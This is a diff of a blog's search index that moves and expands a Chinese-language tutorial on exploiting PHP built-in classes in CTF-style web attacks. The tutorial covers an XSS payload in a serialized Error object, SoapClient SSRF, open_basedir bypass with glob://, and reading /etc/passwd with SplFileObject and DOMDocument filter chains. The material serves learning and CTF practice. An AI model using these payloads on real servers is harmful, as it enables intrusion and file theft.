   </entry>
   <entry>
@@ -6784,125 +7770,6 @@ hr &#123;<span class="attribute">color</span>:sienna;&#125;
 ]]></content>
       <tags>
         <tag>-Web前端 -CSS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>磨好的利剑:PHP原生类</title>
-    <url>/2025/07/01/%E7%A3%A8%E5%A5%BD%E7%9A%84%E5%88%A9%E5%89%91-PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/</url>
-    <content><![CDATA[<h1 id="PHP原生类"><a href="#PHP原生类" class="headerlink" title="PHP原生类"></a>PHP原生类</h1><p>相当综合的应用呢，利用面广的不行，爽赤</p>
-<p>常见的原生类有以下几个</p>
-<pre><code class="highlight plaintext">1.Error/Exception
-2.FilesystemIterator/SplFileObject/DirectoryIterator/GlobIterator
-3.SoapClient
-4.SimpleXMLElement</code></pre>
-
-<p>当然还有有些偶尔能用上的<code>ZipArchive</code></p>
-<h2 id="XSS利用"><a href="#XSS利用" class="headerlink" title="XSS利用"></a>XSS利用</h2><h3 id="Error-Exception内置类"><a href="#Error-Exception内置类" class="headerlink" title="Error&#x2F;Exception内置类"></a>Error&#x2F;Exception内置类</h3><p><strong>Error</strong>:</p>
-<ul>
-<li>仅适用于PHP7版本</li>
-<li>在开启报错的情况下</li>
-</ul>
-<p>我们可以查看一下Error的内置方法</p>
-<pre><code class="highlight php"><span class="meta">&lt;?php</span>
-<span class="variable">$className</span> = <span class="string">&#x27;Error&#x27;</span>;
-
-<span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$className</span>);
-
-<span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;
-    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$className&#125;</span>::<span class="subst">&#123;$method&#125;</span>&quot;</span> . PHP_EOL;
-&#125;
-<span class="meta">?&gt;</span></code></pre>
-
-<p>得到:</p>
-<pre><code class="highlight plaintext">Error::__construct
-Error::__wakeup
-Error::getMessage
-Error::getCode
-Error::getFile
-Error::getLine
-Error::getTrace
-Error::getPrevious
-Error::getTraceAsString
-Error::__toString</code></pre>
-
-<p>那么就可以利用XSS的<code>__toString</code>魔术方法打一个XSS</p>
-<p>测试代码:</p>
-<pre><code class="highlight plaintext">&lt;?php
-$a = unserialize($_GET[&#x27;whoami&#x27;]);
-echo $a;
-?&gt;</code></pre>
-
-<p>(如果不知道原生类的情况下可能直接趋势了吧</p>
-<p>那么就用Error类构造一个POC</p>
-<pre><code class="highlight plaintext">&lt;?php
-$a = new Error(&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;);
-$b = serialize($a);
-echo urlencode($b);  
-?&gt;
-//O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A29%3A%22%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A44%3A%22C%3A%5CUsers%5Cayano%5CPhpstormProjects%5CWWW%5Ctest.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D</code></pre>
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250701145615605.png" alt="image-20250701145615605"></p>
-<p>可以看到成功弹出</p>
-<p><code>Exception</code>也是同理的</p>
-<p>得到</p>
-<pre><code class="highlight plaintext">O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A29%3A%22%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A46%3A%22C%3A%5CUsers%5Cayano%5CPhpstormProjects%5CWWW%5Cmethod.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D</code></pre>
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250701150814244.png" alt="image-20250701150814244"></p>
-<h2 id="SSRF利用"><a href="#SSRF利用" class="headerlink" title="SSRF利用"></a>SSRF利用</h2><p>用Soap之前先要在php.ini里开一下extension</p>
-<p>这里只提供一下PHP8的配置方法，因为7和以上的版本配置的内容是不一样的</p>
-<p>先把路径改一下<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250701160148997.png" alt="image-20250701160148997"></p>
-<p>这里初始是<code>ext</code>，需要改掉并且去掉前面的;</p>
-<p>再找到<code>soap</code></p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250701160246768.png" alt="image-20250701160246768"></p>
-<p>这边也需要去掉前面的;</p>
-<p>这样就算配好了。</p>
-<h3 id="SoapClient何许人也"><a href="#SoapClient何许人也" class="headerlink" title="SoapClient何许人也?"></a>SoapClient何许人也?</h3><p>PHP 的内置类<code> SoapClient</code> 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。</p>
-<p>类摘要如下：</p>
-<pre><code class="highlight plaintext">SoapClient &#123;
-    /* 方法 */
-    public __construct ( string|null $wsdl , array $options = [] )
-    public __call ( string $name , array $args ) : mixed
-    public __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay = false ) : string|null
-    public __getCookies ( ) : array
-    public __getFunctions ( ) : array|null
-    public __getLastRequest ( ) : string|null
-    public __getLastRequestHeaders ( ) : string|null
-    public __getLastResponse ( ) : string|null
-    public __getLastResponseHeaders ( ) : string|null
-    public __getTypes ( ) : array|null
-    public __setCookie ( string $name , string|null $value = null ) : void
-    public __setLocation ( string $location = &quot;&quot; ) : string|null
-    public __setSoapHeaders ( SoapHeader|array|null $headers = null ) : bool
-    public __soapCall ( string $name , array $args , array|null $options = null , SoapHeader|array|null $inputHeaders = null , array &amp;$outputHeaders = null ) : mixed
-&#125;</code></pre>
-
-<p>可以看到，该内置类有一个 <code>__call</code> 方法，当 <code>__call</code> 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 <code>__call</code> 方法，使得 <code>SoapClient</code> 类可以被我们运用在 SSRF 中。<code>SoapClient</code> 这个类也算是目前被挖掘出来最好用的一个内置类。</p>
-<p>该类的构造函数如下：</p>
-<pre><code class="highlight plaintext">public SoapClient :: SoapClient(mixed $wsdl [，array $options ])</code></pre>
-
-<ul>
-<li>第一个参数是用来指明是否是<code>wsdl</code>模式，将该值设为null则表示非<code>wsdl</code>模式。</li>
-<li>第二个参数为一个数组，如果在<code>wsdl</code>模式下，此参数可选；如果在非<code>wsdl</code>模式下，则必须设置location和<code>uri</code>选项，其中<code>location</code>是要将请求发送到的SOAP服务器的URL，而<code>uri</code> 是SOAP服务的目标命名空间。</li>
-</ul>
-<p>在知道两个选项的含义之后payload就相当容易构造了</p>
-<p><strong>设置第一个参数为null，第二个为<code>target_url</code></strong></p>
-<p>这里其实就可以配合<strong>CRLF</strong>或者<strong>HTTP请求走私</strong>搞一下</p>
-<h2 id="open-basedir绕过"><a href="#open-basedir绕过" class="headerlink" title="open_basedir绕过"></a><code>open_basedir</code>绕过</h2><p><code>DirectoryIterator</code>与glob:&#x2F;&#x2F;协议结合将无视<code>open_basedir</code>对目录的限制，可以用来列举出指定目录下的文件。</p>
-<h2 id="任意文件遍历"><a href="#任意文件遍历" class="headerlink" title="任意文件遍历"></a>任意文件遍历</h2><h3 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a><code>SplFileObject</code></h3><p>这个是按行读取的，如果多行读取就需要遍历了</p>
-<pre><code class="highlight php"><span class="meta">&lt;?php</span>
-<span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;
-    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;SplFileObject&#x27;</span>;
-    <span class="keyword">public</span> <span class="variable">$para</span> = <span class="string">&#x27;./flag/flag.php&#x27;</span>;
-&#125;
-<span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();
-<span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);
-<span class="meta">?&gt;</span></code></pre>
-
-
-
-]]></content>
-      <tags>
-        <tag>-Web</tag>
       </tags>
   </entry>
   <entry>
@@ -8156,6 +9023,373 @@ $</code></pre>
 
 
 <h2 id="vm2逃逸"><a href="#vm2逃逸" class="headerlink" title="vm2逃逸"></a>vm2逃逸</h2>]]></content>
+      <tags>
+        <tag>-Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>磨好的利剑:PHP原生类</title>
+    <url>/2025/07/01/%E7%A3%A8%E5%A5%BD%E7%9A%84%E5%88%A9%E5%89%91-PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/</url>
+    <content><![CDATA[<h1 id="PHP原生类"><a href="#PHP原生类" class="headerlink" title="PHP原生类"></a>PHP原生类</h1><p>相当综合的应用呢，利用面广的不行，爽赤</p>
+<p>常见的原生类有以下几个</p>
+<pre><code class="highlight plaintext">1.Error/Exception
+2.FilesystemIterator/SplFileObject/DirectoryIterator/GlobIterator
+3.SoapClient
+4.SimpleXMLElement</code></pre>
+
+<p>当然还有有些偶尔能用上的<code>ZipArchive</code></p>
+<h2 id="XSS利用"><a href="#XSS利用" class="headerlink" title="XSS利用"></a>XSS利用</h2><h3 id="Error-Exception内置类"><a href="#Error-Exception内置类" class="headerlink" title="Error&#x2F;Exception内置类"></a>Error&#x2F;Exception内置类</h3><p><strong>Error</strong>:</p>
+<ul>
+<li>仅适用于PHP7版本</li>
+<li>在开启报错的情况下</li>
+</ul>
+<p>我们可以查看一下Error的内置方法</p>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="variable">$className</span> = <span class="string">&#x27;Error&#x27;</span>;
+
+<span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$className</span>);
+
+<span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;
+    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$className&#125;</span>::<span class="subst">&#123;$method&#125;</span>&quot;</span> . PHP_EOL;
+&#125;
+<span class="meta">?&gt;</span></code></pre>
+
+<p>得到:</p>
+<pre><code class="highlight plaintext">Error::__construct
+Error::__wakeup
+Error::getMessage
+Error::getCode
+Error::getFile
+Error::getLine
+Error::getTrace
+Error::getPrevious
+Error::getTraceAsString
+Error::__toString</code></pre>
+
+<p>那么就可以利用XSS的<code>__toString</code>魔术方法打一个XSS</p>
+<p>测试代码:</p>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;whoami&#x27;</span>]);
+<span class="keyword">echo</span> <span class="variable">$a</span>;
+<span class="meta">?&gt;</span></code></pre>
+
+<p>(如果不知道原生类的情况下可能直接趋势了吧</p>
+<p>那么就用Error类构造一个POC</p>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);
+<span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);
+<span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);  
+<span class="meta">?&gt;</span>
+<span class="comment">//O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A29%3A%22%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A44%3A%22C%3A%5CUsers%5Cayano%5CPhpstormProjects%5CWWW%5Ctest.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D</span></code></pre>
+
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250701145615605.png" alt="image-20250701145615605"></p>
+<p>可以看到成功弹出</p>
+<p><code>Exception</code>也是同理的</p>
+<p>得到</p>
+<pre><code class="highlight plaintext">O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A29%3A%22%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A46%3A%22C%3A%5CUsers%5Cayano%5CPhpstormProjects%5CWWW%5Cmethod.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D</code></pre>
+
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250701150814244.png" alt="image-20250701150814244"></p>
+<h2 id="SSRF利用"><a href="#SSRF利用" class="headerlink" title="SSRF利用"></a>SSRF利用</h2><p>用Soap之前先要在php.ini里开一下extension</p>
+<p>这里只提供一下PHP8的配置方法，因为7和以上的版本配置的内容是不一样的</p>
+<p>先把路径改一下<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250701160148997.png" alt="image-20250701160148997"></p>
+<p>这里初始是<code>ext</code>，需要改掉并且去掉前面的;</p>
+<p>再找到<code>soap</code></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250701160246768.png" alt="image-20250701160246768"></p>
+<p>这边也需要去掉前面的;</p>
+<p>这样就算配好了。</p>
+<h3 id="SoapClient何许人也"><a href="#SoapClient何许人也" class="headerlink" title="SoapClient何许人也?"></a>SoapClient何许人也?</h3><p>PHP 的内置类<code> SoapClient</code> 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。</p>
+<p>类摘要如下：</p>
+<pre><code class="highlight plaintext">SoapClient &#123;
+    /* 方法 */
+    public __construct ( string|null $wsdl , array $options = [] )
+    public __call ( string $name , array $args ) : mixed
+    public __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay = false ) : string|null
+    public __getCookies ( ) : array
+    public __getFunctions ( ) : array|null
+    public __getLastRequest ( ) : string|null
+    public __getLastRequestHeaders ( ) : string|null
+    public __getLastResponse ( ) : string|null
+    public __getLastResponseHeaders ( ) : string|null
+    public __getTypes ( ) : array|null
+    public __setCookie ( string $name , string|null $value = null ) : void
+    public __setLocation ( string $location = &quot;&quot; ) : string|null
+    public __setSoapHeaders ( SoapHeader|array|null $headers = null ) : bool
+    public __soapCall ( string $name , array $args , array|null $options = null , SoapHeader|array|null $inputHeaders = null , array &amp;$outputHeaders = null ) : mixed
+&#125;</code></pre>
+
+<p>可以看到，该内置类有一个 <code>__call</code> 方法，当 <code>__call</code> 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 <code>__call</code> 方法，使得 <code>SoapClient</code> 类可以被我们运用在 SSRF 中。<code>SoapClient</code> 这个类也算是目前被挖掘出来最好用的一个内置类。</p>
+<p>该类的构造函数如下：</p>
+<pre><code class="highlight plaintext">public SoapClient :: SoapClient(mixed $wsdl [，array $options ])</code></pre>
+
+<ul>
+<li>第一个参数是用来指明是否是<code>wsdl</code>模式，将该值设为null则表示非<code>wsdl</code>模式。</li>
+<li>第二个参数为一个数组，如果在<code>wsdl</code>模式下，此参数可选；如果在非<code>wsdl</code>模式下，则必须设置location和<code>uri</code>选项，其中<code>location</code>是要将请求发送到的SOAP服务器的URL，而<code>uri</code> 是SOAP服务的目标命名空间。</li>
+</ul>
+<p>在知道两个选项的含义之后payload就相当容易构造了</p>
+<p><strong>设置第一个参数为null，第二个为<code>target_url</code></strong></p>
+<p>这里其实就可以配合<strong>CRLF</strong>或者<strong>HTTP请求走私</strong>搞一下</p>
+<h2 id="open-basedir绕过"><a href="#open-basedir绕过" class="headerlink" title="open_basedir绕过"></a><code>open_basedir</code>绕过</h2><p><code>DirectoryIterator</code>与glob:&#x2F;&#x2F;协议结合将无视<code>open_basedir</code>对目录的限制，可以用来列举出指定目录下的文件。</p>
+<h2 id="哈希比较绕过"><a href="#哈希比较绕过" class="headerlink" title="哈希比较绕过"></a>哈希比较绕过</h2><p><code>Error</code>类是所有php内部错误类的基类 从php7开始被引入</p>
+<p><code>Exception</code>类是所有异常的类，从php5开始被引入</p>
+<p>这两个都存在<code>__tostring</code>方法</p>
+<p>通过echo&#x2F;return就可以直接触发</p>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);<span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);<span class="comment">//注意这是同一行</span>
+<span class="keyword">echo</span> <span class="variable">$a</span>;
+<span class="keyword">echo</span> <span class="variable">$b</span>;
+<span class="keyword">if</span>(<span class="variable">$a</span> != <span class="variable">$b</span>)
+&#123;
+	<span class="keyword">echo</span> <span class="string">&quot;a!=b&quot;</span>;
+&#125;
+<span class="keyword">echo</span><span class="string">&quot;\n&quot;</span>;
+<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>));<span class="comment">//这里输出是true</span>
+<span class="meta">?&gt;</span></code></pre>
+
+<p>但是如果这样写</p>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);
+<span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);<span class="comment">//这里不是同一行</span>
+<span class="keyword">echo</span> <span class="variable">$a</span>;
+<span class="keyword">echo</span> <span class="variable">$b</span>;
+<span class="keyword">if</span>(<span class="variable">$a</span> != <span class="variable">$b</span>)
+&#123;
+	<span class="keyword">echo</span> <span class="string">&quot;a!=b&quot;</span>;
+&#125;
+<span class="keyword">echo</span><span class="string">&quot;\n&quot;</span>;
+<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>));<span class="comment">//这里输出的是false</span>
+<span class="meta">?&gt;</span></code></pre>
+
+<p>这是为什么呢(雾)，看一眼输出就可以发现它的返回值是带有行数的，这个就会导致哈希值不一样</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250711143413796.png" alt="image-20250711143413796"></p>
+<p>Exception 类与 Error 的使用和结果完全一样，只不过 Exception 类适用于PHP 5和7，而 Error 只适用于 PHP 7</p>
+<h2 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h2><h3 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a><code>SplFileObject</code></h3><p>这个是按行读取的，如果多行读取就需要遍历了</p>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="variable">$context</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>);
+<span class="keyword">foreach</span>(<span class="variable">$context</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;
+    <span class="keyword">echo</span>(<span class="variable">$f</span>);
+&#125;
+<span class="comment">// 或者用伪协议base64直接输出，有时候有奇效</span>
+<span class="variable">$context</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=/etc/passwd&#x27;</span>);
+<span class="keyword">echo</span> <span class="variable">$context</span>;</code></pre>
+
+<p>写:</p>
+<pre><code class="highlight plaintext">$f = new SplFileObject(&#x27;./file&#x27;, &quot;w&quot;);
+$f-&gt;fwrite(&quot;file&quot;);</code></pre>
+
+<h3 id="DOMDocumnet"><a href="#DOMDocumnet" class="headerlink" title="DOMDocumnet"></a>DOMDocumnet</h3><p>这个类本意是处理 XML 和 HTML 内容，不过也有相应的读&#x2F;写文件的方法，只要利用 伪协议 稍做加工就可以无杂质地对数据进行操作。</p>
+<p>读文件:</p>
+<pre><code class="highlight php"><span class="comment"># 读文件</span>
+<span class="comment"># 先用 convert.base64 将文件内容base64，避免出现额外的 &lt;p&gt; 标签</span>
+<span class="comment"># 然后将读取的内容转换成 XML 格式，再加载它，最后取 &lt;p&gt; 标签内的内容 (如果想获取纯净流则可以再进行base64解码)</span>
+<span class="variable">$f</span>=<span class="string">&quot;/etc/passwd&quot;</span>;
+<span class="variable">$d</span>=<span class="keyword">new</span> <span class="title class_">DOMDocument</span>();
+<span class="variable">$d</span>-&gt;<span class="title function_ invoke__">loadHTMLFile</span>(<span class="string">&quot;php://filter/convert.base64-encode/resource=<span class="subst">$f</span>&quot;</span>);
+<span class="variable">$d</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$d</span>-&gt;<span class="title function_ invoke__">saveXML</span>());
+<span class="keyword">echo</span> <span class="variable">$d</span>-&gt;<span class="title function_ invoke__">getElementsByTagName</span>(<span class="string">&quot;p&quot;</span>)[<span class="number">0</span>]-&gt;textContent;</code></pre>
+
+<p>写文件</p>
+<pre><code class="highlight php"><span class="comment"># 写文件</span>
+<span class="comment"># 先用 string.strip_tags 将多余的 HTML 标签去掉，然后再用 convert.base64 将多余的其他杂质 (如空格，双引号等非base64字符去掉)</span>
+<span class="variable">$f</span>=<span class="string">&quot;./test.php&quot;</span>;
+<span class="variable">$d</span>=<span class="keyword">new</span> <span class="title class_">DOMDocument</span>();
+<span class="variable">$d</span>-&gt;<span class="title function_ invoke__">loadHTML</span>(<span class="string">&quot;dGVzdA==&quot;</span>);
+<span class="variable">$d</span>-&gt;<span class="title function_ invoke__">saveHtmlFile</span>(<span class="string">&quot;php://filter/string.strip_tags|convert.base64-decode/resource=<span class="subst">$f</span>&quot;</span>);</code></pre>
+
+<p>读文件：<code>Xinclude</code></p>
+<pre><code class="highlight plaintext">&lt;?php $a = filter_input(1,&quot;file&quot;);; $xml = &lt;&lt;&lt;EOD &lt;?xml version=&quot;1.0&quot; ?&gt; &lt;root xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt; &lt;xi:include href=&quot;$a&quot; parse=&quot;text&quot;/&gt; &lt;/root&gt; EOD; $dom = new DOMDocument; $dom-&gt;preserveWhiteSpace = false; $dom-&gt;formatOutput = true; $dom-&gt;loadXML($xml); $dom-&gt;xinclude(); echo $dom-&gt;saveXML();</code></pre>
+
+<h2 id="文件探测"><a href="#文件探测" class="headerlink" title="文件探测"></a>文件探测</h2><h3 id="文件是否存在-finfo"><a href="#文件是否存在-finfo" class="headerlink" title="文件是否存在(finfo)"></a>文件是否存在(<code>finfo</code>)</h3><p>利用版本: (PHP &gt;&#x3D; 5.3.0, PECL <code>fileinfo</code> &gt;&#x3D; 0.1.0) 判断文件是否存在(判断文件类型)</p>
+<pre><code class="highlight php"><span class="variable">$f</span> = <span class="string">&quot;./aasd.php&quot;</span>; <span class="variable">$ff</span> = <span class="keyword">new</span> <span class="title function_ invoke__">finfo</span>(FILEINFO_MIME); <span class="keyword">echo</span> <span class="variable">$ff</span>-&gt;<span class="title function_ invoke__">file</span>(<span class="variable">$f</span>);</code></pre>
+
+<h3 id="目录遍历-Directory"><a href="#目录遍历-Directory" class="headerlink" title="目录遍历:Directory"></a>目录遍历:Directory</h3><p>这个类本意是不能够直接通过 new 方式进行创建利用，当使用 dir 函数时，这个类会被实例化。但我们依然可以直接实例化并使用其中的方法</p>
+<p><strong>判断文件是否存在:</strong></p>
+<pre><code class="highlight php"><span class="comment"># 判断某个目录是否存在，</span>
+<span class="comment"># 如果存在返回目录字符串，若不存在则产生警告并返回NULL</span>
+<span class="variable">$dir</span>=<span class="string">&quot;/etc&quot;</span>;
+<span class="keyword">echo</span> (<span class="keyword">new</span> <span class="built_in">Directory</span>)-&gt;<span class="title function_ invoke__">read</span>(<span class="title function_ invoke__">opendir</span>(<span class="variable">$dir</span>));</code></pre>
+
+<p><strong>读取目录:</strong></p>
+<pre><code class="highlight php"><span class="variable">$dir</span> = <span class="string">&quot;/etc&quot;</span>;
+<span class="variable">$d</span> = <span class="keyword">new</span> <span class="built_in">Directory</span>;
+<span class="variable">$d</span>-&gt;resource = <span class="title function_ invoke__">opendir</span>(<span class="variable">$dir</span>);
+<span class="keyword">while</span>((<span class="variable">$c</span> = <span class="variable">$d</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$d</span>-&gt;resource)))&#123;<span class="keyword">echo</span> <span class="variable">$c</span>.<span class="string">&quot;\n&quot;</span>;&#125;;</code></pre>
+
+
+
+<h3 id="目录遍历-DirectoryIterator"><a href="#目录遍历-DirectoryIterator" class="headerlink" title="目录遍历:DirectoryIterator"></a>目录遍历:<code>DirectoryIterator</code></h3><p><code>DirectoryIterator</code> 会创建一个指定目录的迭代器。当执行到echo函数时，会触发<code>DirectoryIterator</code>类中的 <code>__toString()</code> 方法，输出指定目录里面经过排序之后的第一个文件名.</p>
+<p>遍历文件目录,直接对文件全部输出出来.</p>
+<pre><code class="highlight plaintext">&lt;?php $dir=new DirectoryIterator(&quot;/&quot;); foreach($dir as $f)&#123;    echo($f.&#x27;&lt;br&gt;&#x27;);    //echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;); &#125;</code></pre>
+
+<p>利用<code> DirectoryIterator</code> 类对象 + glob:&#x2F;&#x2F; 协议获取目录结构，能够突破 <code>open_basedir</code> 的限制：</p>
+<pre><code class="highlight plaintext">$dir=new DirectoryIterator(&quot;glob:///*&quot;); foreach($dir as $f)&#123;    echo($f.&#x27;&lt;br&gt;&#x27;);    //echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;); &#125;</code></pre>
+
+<p>一些其他的用法：</p>
+<pre><code class="highlight plaintext"># 简单列目录
+$dir = &quot;./geek&quot;;
+$d = new DirectoryIterator($dir);
+while ($d-&gt;valid())&#123;
+    echo $d.&quot;\n&quot;;
+    $d-&gt;next();
+&#125;
+
+# 也可以用来获取文件的信息
+$dir = &quot;./geek&quot;;
+$d = new DirectoryIterator($dir);
+while($d-&gt;valid())&#123;
+
+    # 获取最后访问时间
+    var_dump($d-&gt;getATime());
+    # 获取创建时间
+    var_dump($d-&gt;getCTime());
+    # 获取最后修改时间
+    var_dump($d-&gt;getMtime());
+    # 获取文件名，
+    # 直接用 __toString 也可以
+    var_dump($d-&gt;getFilename());
+    var_dump((string)$d);
+    # 获取文件名 (自动除去后缀名)，
+    # 比如除去 .php 后缀名
+    var_dump($d-&gt;getBasename(&quot;php&quot;));
+    # 获取目录和文件名
+    var_dump($d-&gt;getPathname());
+    # 获取文件所有者
+    var_dump($d-&gt;getOwner());
+    # 获取文件所有组
+    var_dump($d-&gt;getGroup());
+    # 获取文件inode编号
+    var_dump($d-&gt;getInode());
+    # 获取文件权限
+    var_dump(substr(sprintf(&quot;%o&quot;,$d-&gt;getPerms()),-4));
+    # 获取文件大小
+    var_dump(($d-&gt;getSize()/1024).&quot; kb&quot;);
+    # 获取文件类型 (file/dir)
+    var_dump($d-&gt;getType());
+    # 判断文件是否是目录
+    var_dump($d-&gt;isDir());
+    # 判断文件是否是文件 (不是目录)
+    var_dump($d-&gt;isFile());
+    # 判断文件是否为 ./..
+    var_dump($d-&gt;isDot());
+    # 判断文件是否可执行
+    var_dump($d-&gt;isExecute());
+    # 判断文件是否是链接文件
+    var_dump($d-&gt;isLink());
+    # 判断文件是否可读
+    var_dump($d-&gt;isReadable());
+    # 判断文件是否可写
+    var_dump($d-&gt;isWriteable());
+
+    $d-&gt;next();
+&#125;
+
+# 一些其他方法的功能
+# 获取当前目录路径 (其实也就是 ? )
+var_dump($d-&gt;path());
+# 获取当前元素的索引
+var_dump($d-&gt;key());
+# 将当前索引移动到下一个元素
+$d-&gt;next();
+# 将索引重置到开头
+$d-&gt;rewind();
+# 设置索引
+$d-&gt;seek(0);
+# 判断当前索引的文件是否合法 (是否是一个文件)
+$d-&gt;vaild();
+</code></pre>
+
+<h3 id="目录遍历-FilesystemIterator"><a href="#目录遍历-FilesystemIterator" class="headerlink" title="目录遍历:FilesystemIterator"></a>目录遍历:<code>FilesystemIterator</code></h3><p>利用版本：(PHP 5 &gt;&#x3D; 5.3.0, PHP 7)</p>
+<p>其实这个类实际上也就是 <code>DirectoryIterator</code> 类的升级版，基本继承了<code> DirectorIterator</code> 类的所有方法，所以利用方式和 <code>DirectorIterator</code> 一样:</p>
